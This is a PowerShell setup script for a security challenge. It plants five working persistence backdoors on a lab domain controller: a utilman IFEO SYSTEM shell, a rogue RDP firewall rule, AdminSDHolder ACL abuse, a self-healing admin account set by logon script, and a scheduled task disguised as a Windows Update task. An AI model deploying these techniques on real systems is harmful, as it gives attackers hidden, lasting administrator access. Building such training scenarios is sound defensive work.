# plant-backdoors.ps1
# Plants a second, different attacker's persistence mechanisms on the corp.local DC.
# DO NOT READ THIS FILE BEFORE ATTEMPTING THE CHALLENGE

Write-Host "=== Setting up challenge scenario ==="

$ProgressPreference = 'SilentlyContinue'
Import-Module ActiveDirectory

Start-Sleep -Seconds 30

# --- 1. Accessibility shortcut (IFEO) backdoor ---
# Sets a debugger for utilman.exe so pressing Win+U at the logon screen
# spawns cmd.exe as SYSTEM instead of launching Ease of Access.
$ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
New-Item -Path $ifeoPath -Force | Out-Null
New-ItemProperty -Path $ifeoPath -Name "Debugger" -Value "cmd.exe" -PropertyType String -Force | Out-Null

# --- 2. Rogue firewall rule ---
New-NetFirewallRule `
    -DisplayName "Remote Desktop - Maintenance Access" `
    -Direction Inbound -Protocol TCP -LocalPort 3389 `
    -RemoteAddress Any -Action Allow -Profile Any | Out-Null

# --- 3. AdminSDHolder ACL abuse ---
New-ADUser `
    -Name "svc-reports" `
    -SamAccountName "svc-reports" `
    -Path "CN=Users,DC=corp,DC=local" `
    -AccountPassword (ConvertTo-SecureString "R3ports!2024" -AsPlainText -Force) `
    -Enabled $true `
    -PasswordNeverExpires $true `
    -Description "Automated reporting service account"
dsacls.exe "CN=AdminSDHolder,CN=System,DC=corp,DC=local" /G "CORP\svc-reports:GA" | Out-Null

# --- 4. Self-healing backdoor account via logon script ---
$logonScript = @'
@echo off
net user svc-helper >nul 2>&1
if errorlevel 1 (
    net user svc-helper "H3lper!2024" /add
    net localgroup administrators svc-helper /add
)
'@
$scriptsDir = "C:\Windows\SYSVOL\domain\scripts"
New-Item -Path $scriptsDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
Set-Content -Path "$scriptsDir\selfheal.bat" -Value $logonScript
Set-ADUser -Identity jsmith -Replace @{scriptPath = "selfheal.bat" }

# --- 5. Disguised scheduled task ---
# Named to look like a legitimate Windows Update Orchestrator maintenance
# task; actually re-applies the IFEO debugger key from step 1 daily.
$taskArgument = "-WindowStyle Hidden -ep bypass -c ""New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe' -Force | Out-Null; New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe' -Name Debugger -Value cmd.exe -PropertyType String -Force"""
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $taskArgument
$taskTrigger = New-ScheduledTaskTrigger -Daily -At 3am
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask `
    -TaskName "USO_Svc_Refresh" `
    -TaskPath "\Microsoft\Windows\UpdateOrchestratorEx\" `
    -Action $taskAction `
    -Trigger $taskTrigger `
    -Principal $taskPrincipal `
    -Description "Update Session Orchestrator maintenance refresh" | Out-Null

Write-Host "=== Challenge scenario ready ==="
Write-Host "Persistence mechanisms planted: 5"
